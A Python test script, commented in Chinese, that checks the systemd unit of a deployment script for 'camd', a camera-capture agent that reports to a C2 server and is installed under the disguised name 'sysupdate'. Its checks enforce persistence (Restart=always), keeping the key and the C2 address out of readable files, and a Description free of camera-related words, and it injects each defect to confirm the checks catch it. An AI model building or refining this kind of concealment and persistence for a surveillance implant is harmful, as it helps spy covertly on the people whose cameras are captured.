#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""一键部署脚本 systemd 单元静态契约守卫。

背景：systemd 主路径在本沙盒**无法运行时验证**（PID 1 非 systemd，
/run/systemd/private 无监听者，三种 unshare 组合全部失败）。既然运行时
验证做不到，就必须把"单元内容应当满足什么"做成永久静态契约——否则
systemd 分支是整条链上唯一一块"写了、编译通过、从未被任何东西检查过"
的地方，而它恰恰是生产环境的主路径（cron 只是降级）。

契约覆盖三组失效：

  1. 驻留能力缺失：没有 Restart=always 时，camd 因参数错误或 C2 不可达
     退出后就再也不会起来。systemctl enable 成功、restart 返回 0、部署
     侧全绿，而服务从未真正运行过——这是最难发现的一类失效。

  2. 站点信息泄露：单元文件是 0644，且常进配置管理与审计采集。密钥、
     C2 地址、front-host 一旦写进 ExecStart，一条 cat 就能读到，而拿到
     主密钥意味着能解密回传的**全部**画面。

  3. 描述点明功能：Description=Camera Service 直接告诉读的人这是什么。
     该字段对运行毫无作用，却是纯暴露面。

另加 run.sh 路径同源一组：run.sh 里的 conf/bin 必须与主脚本 CONF_FILE/
BIN_DST 一致。此前是 ROOT_PREFIX + 硬编码 "/etc/camd/camd.conf"，两处
不同源——改了 CONF_DIR 变量，run.sh 仍读旧路径，表现为"改配置无效"。

三组各配反向注入。不做就不能证明断言不是恒绿。
"""
import os
import re
import shutil
import subprocess
import sys


def _default_name(tpl):
    m = re.search(r'^NAME="\$\{NAME:-([^}]+)\}"',
                  open(tpl, encoding="utf-8").read(), re.M)
    if not m:
        raise SystemExit("[FATAL] 无法从模板解析默认 NAME——"
                         "守卫会按旧名找落点，失配方向是假阴性（恒绿）")
    return m.group(1)



HERE = os.path.dirname(os.path.abspath(__file__))
MOD = os.path.dirname(HERE)
REPO = os.path.dirname(MOD)
TEMPLATE = os.path.join(MOD, "onekey.sh")
DEFN = _default_name(TEMPLATE)
GEN = os.path.join(MOD, "make_onekey.py")
CAMD = os.path.join(REPO, "agent_windows", "build", "linux", "camd")

PASS = 0
FAIL = 0
SKIP = 0


def check(cond, name, detail=""):
    global PASS, FAIL
    if cond:
        PASS += 1
        print("[PASS] " + name)
    else:
        FAIL += 1
        print("[FAIL] " + name + (("  -- " + detail) if detail else ""))


def skip(name, why):
    global SKIP
    SKIP += 1
    print("[SKIP] " + name + "  -- " + why)


# ---- 模板变异 --------------------------------------------------------------
# 备份一律用 cp。用 mv 的话，一旦还原前被打断，备份就没了——那会让注入态
# 不可逆，而本脚本每次跑都要改真实模板文件。
BAK = TEMPLATE + ".bak.uc"


def mutate(kind):
    """把模板改成缺陷态。返回 True 表示确实改成了（old 唯一命中）。"""
    shutil.copyfile(TEMPLATE, BAK)
    s = open(TEMPLATE, encoding="utf-8").read()
    pairs = {
        # 描述泄露：退回点明功能的写法
        "desc": ("Description=$UNIT_DESC\n", "Description=Camera Service\n"),
        # 去掉崩溃自拉起：camd 退出即永久消失
        "restart": ("Restart=always\n", ""),
        # run.sh 退回硬编码路径（变量与字面量不同源）。
        # 必须用字面量而非 $ROOT_PREFIX：模板开了 set -u，heredoc 里引用
        # 未定义变量会直接让 cat 失败、install 中断——那验到的是"脚本崩了"
        # 而不是"路径不同源"，两者症状都是 install rc=1，排查方向完全不同。
        "paths": ('CONF_ABS="$CONF_FILE"\nBIN_ABS="$BIN_DST"\n',
                  'CONF_ABS="/etc/sysupdate/sysupdate.conf"\n'
                  'BIN_ABS="/usr/local/bin/sysupdate"\n'),
    }
    old, new = pairs[kind]
    n = s.count(old)
    if n != 1:
        restore()
        raise SystemExit("[FATAL] 变异锚点命中 %d 次（期望 1）: %s" % (n, kind))
    open(TEMPLATE, "w", encoding="utf-8").write(s.replace(old, new))
    return True


def restore():
    if os.path.exists(BAK):
        shutil.copyfile(BAK, TEMPLATE)
        os.remove(BAK)


def gen_script(path):
    r = subprocess.run([sys.executable, GEN, "amd64=" + CAMD, "-o", path],
                       capture_output=True, text=True, cwd=MOD)
    return r.returncode == 0, r.stdout + r.stderr


def build_case(tag, c2="127.0.0.1:1"):
    """完整跑一遍：生成脚本 -> install(假根) -> renderunit -> 读产物。"""
    pfx = "/tmp/.uc_" + tag
    shutil.rmtree(pfx, ignore_errors=True)
    ok, out = gen_script("/tmp/.uc_%s.sh" % tag)
    if not ok:
        return None, "生成脚本失败: " + out[-200:]
    env = dict(os.environ, PREFIX=pfx)
    r = subprocess.run(["sh", "/tmp/.uc_%s.sh" % tag, "install",
                        "--c2", c2, "--backend", "mock"],
                       capture_output=True, text=True, cwd=MOD, env=env)
    if r.returncode != 0:
        return None, "install rc=%d: %s" % (r.returncode, r.stdout[-300:])
    r2 = subprocess.run(["sh", "/tmp/.uc_%s.sh" % tag, "renderunit",
                         "--prefix", pfx],
                        capture_output=True, text=True, cwd=MOD)
    unit = os.path.join(pfx, "etc/systemd/system/sysupdate.service")
    runner = os.path.join(pfx, "var/lib/sysupdate/run.sh")
    return {
        "pfx": pfx,
        "unit": unit,
        "unit_txt": open(unit, encoding="utf-8").read() if os.path.exists(unit) else "",
        "runner_txt": open(runner, encoding="utf-8").read() if os.path.exists(runner) else "",
        "render_rc": r2.returncode,
        "render_out": r2.stdout + r2.stderr,
        "conf": os.path.join(pfx, "etc/sysupdate/sysupdate.conf"),
        "bin": os.path.join(pfx, "usr/local/bin/sysupdate"),
    }, None


# ---- 契约断言 --------------------------------------------------------------
LEAK_WORDS = ("camera", "cam", "capture", "video", "webcam",
              "mjpeg", "v4l2", "snapshot", "摄像", "采集")


def assert_contract(c, tag):
    u = c["unit_txt"]
    print("--- %s ---" % tag)
    check(bool(u), "U1 单元文件已渲染", "单元为空")
    if not u:
        return

    # 驻留能力
    check(re.search(r"^Restart=always\s*$", u, re.M) is not None,
          "U2 单元含 Restart=always（崩溃后自拉起）")

    # 密钥注入通路
    m = re.search(r"^EnvironmentFile=(.+)$", u, re.M)
    check(m is not None, "U3 单元含 EnvironmentFile（密钥注入通路）")
    if m:
        check(m.group(1).strip() == c["conf"],
              "U3b EnvironmentFile 指向 conf 本体",
              "实际=%s 期望=%s" % (m.group(1).strip(), c["conf"]))

    # 启动器：必须是 wrapper，否则 ExecStart 里的 $C2_ADDR 不会被
    # EnvironmentFile 替换（真 systemd 实测踩出来的缺陷）
    e = re.search(r"^ExecStart=(.+)$", u, re.M)
    check(e is not None and e.group(1).strip().endswith("/run.sh"),
          "U7 ExecStart 指向 run.sh 包装器（参数才能正确展开）",
          "" if not e else e.group(1).strip())

    # 静态校验
    if shutil.which("systemd-analyze"):
        check(c["render_rc"] == 0 and "校验通过" in c["render_out"],
              "U8 单元通过 systemd-analyze 静态校验", c["render_out"][-200:])
    else:
        skip("U8 单元静态校验", "无 systemd-analyze")

    # ---- 泄露面 ----
    key_leak = (re.search(r"CAMD_KEY\s*=", u) is not None
                or re.search(r"\b[0-9a-f]{64}\b", u) is not None)
    check(not key_leak, "U4 单元不含明文密钥",
          "出现 CAMD_KEY= 或 64 位十六进制")

    c2_leak = (("--sink" in u) or ("tcp://" in u) or ("front://" in u)
               or ("127.0.0.1:1" in u))
    check(not c2_leak, "U5 单元不含 C2 地址/回传参数")

    d = re.search(r"^Description=(.*)$", u, re.M)
    dtxt = d.group(1) if d else ""
    hit = [w for w in LEAK_WORDS if w in dtxt.lower()]
    check(not hit, "U6 Description 不点明功能（%s）" % (dtxt or "无"),
          "命中敏感词: %s" % ",".join(hit) if hit else "")

    # ---- run.sh 路径同源 ----
    rs = c["runner_txt"]
    mc = re.search(r'^CONF_ABS="([^"]+)"', rs, re.M)
    mb = re.search(r'^BIN_ABS="([^"]+)"', rs, re.M)
    check(mc is not None and mc.group(1) == c["conf"],
          "U9 run.sh 的 conf 路径与 CONF_FILE 同源",
          "" if not mc else "实际=%s 期望=%s" % (mc.group(1), c["conf"]))
    check(mb is not None and mb.group(1) == c["bin"],
          "U10 run.sh 的 bin 路径与 BIN_DST 同源",
          "" if not mb else "实际=%s 期望=%s" % (mb.group(1), c["bin"]))


def main():
    # global 必须在任何读取之前声明，否则 SyntaxError:
    # name 'PASS' is used prior to global declaration
    global PASS, FAIL
    mode = sys.argv[1] if len(sys.argv) > 1 else "forward"

    if mode == "forward":
        c, err = build_case("fwd")
        if err:
            print("[FATAL] " + err)
            return 1
        assert_contract(c, "正向")
        shutil.rmtree(c["pfx"], ignore_errors=True)
        print("PASS=%d FAIL=%d SKIP=%d" % (PASS, FAIL, SKIP))
        return 1 if FAIL else 0

    # ---- 反向：注入缺陷态，目标断言必须变红 ----
    targets = {
        "desc": ("U6", "描述泄露未被发现"),
        "restart": ("U2", "缺失 Restart=always 未被发现"),
        "paths": ("U9", "run.sh 路径不同源未被发现"),
    }
    kind = mode
    if kind not in targets:
        print("用法: verify_unit_contract.py [forward|desc|restart|paths]")
        return 2
    want, why = targets[kind]
    try:
        mutate(kind)
        c, err = build_case("mut_" + kind)
        if err:
            print("[FATAL] " + err)
            return 1
        # 复用断言，但只关心目标项是否变红
        lines = []
        buf = []

        def cap(cond, name, detail=""):
            buf.append((cond, name))
            lines.append(("PASS" if cond else "FAIL", name))

        g = globals()
        old = g["check"]
        g["check"] = cap
        try:
            assert_contract(c, "反向(%s)" % kind)
        finally:
            g["check"] = old
        got_fail = [n for st, n in lines if st == "FAIL" and n.startswith(want)]
        if got_fail:
            print("[PASS] 反向守卫生效：%s 变红 -> %s" % (want, ",".join(got_fail)))
            PASS += 1
        else:
            print("[FAIL] 反向守卫失效：%s 未变红（%s）" % (want, why))
            FAIL += 1
        shutil.rmtree(c["pfx"], ignore_errors=True)
        print("PASS=%d FAIL=%d" % (PASS, FAIL))
        return 1 if FAIL else 0
    finally:
        restore()


if __name__ == "__main__":
    rc = main()
    print("EXIT=%d" % rc)
    sys.exit(rc)
